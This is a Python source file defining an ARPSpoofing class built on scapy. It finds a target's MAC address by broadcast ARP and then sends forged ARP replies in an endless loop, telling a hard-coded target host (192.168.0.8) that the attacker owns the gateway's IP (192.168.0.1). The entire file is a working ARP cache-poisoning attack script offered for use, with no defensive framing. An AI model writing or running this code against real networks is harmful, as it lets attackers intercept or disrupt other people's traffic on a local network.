import scapy.all as scapy

class ARPSpoofing:
    """A class which contain the art spoofing necessary functions."""

    def __init__(self, defualtGatewayIP, targetIP):
        self.defualtGatewayIP = defualtGatewayIP
        self.targetIP = targetIP
        self.targetMAC = None
        self.isActive = False


    def findTargetMacAddr(self, ip):
        # The function gets an host's ip.
        # The function returns the mac address of the given hosts.

        # The destination mac is the broadcast's mac address.
        arpSpoofingPacket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
        # When verbose parameter equals 0, the function won't print all the log prints.
        reply, _ = scapy.srp(arpSpoofingPacket, timeout=3, verbose=0)
        if not reply:
            return None
        return reply[0][1].src


    def StartSpoofing(self):
        # The function gets an integer that represent the amount of seconds which the spoofing contine.
        # The function starts the spoofing of the target's host.
        while not self.targetMAC:
            self.targetMAC = self.findTargetMacAddr(self.targetIP)

        self.isActive = True
        # When the op parameter equals is-at, the packet considered as respond
        arpRespondPacket = scapy.ARP(psrc=self.defualtGatewayIP, pdst=self.targetIP, hwdst=self.targetMAC, op="is-at")
        print("The arp spoofing attack started!")
        while self.isActive:
            scapy.send(arpRespondPacket, verbose=0)


    def StopSpoofing(self):
        # The function gets nothing.
        # The function change the active parameter to False in order to stop the spoofing.
        self.isActive = False
        print("The arp spoofing attack stopped!")

def main():
    arpSpoofingAttackObject = ARPSpoofing(defualtGatewayIP="192.168.0.1", targetIP="192.168.0.8")
    arpSpoofingAttackObject.StartSpoofing()

if __name__ == "__main__":
    main()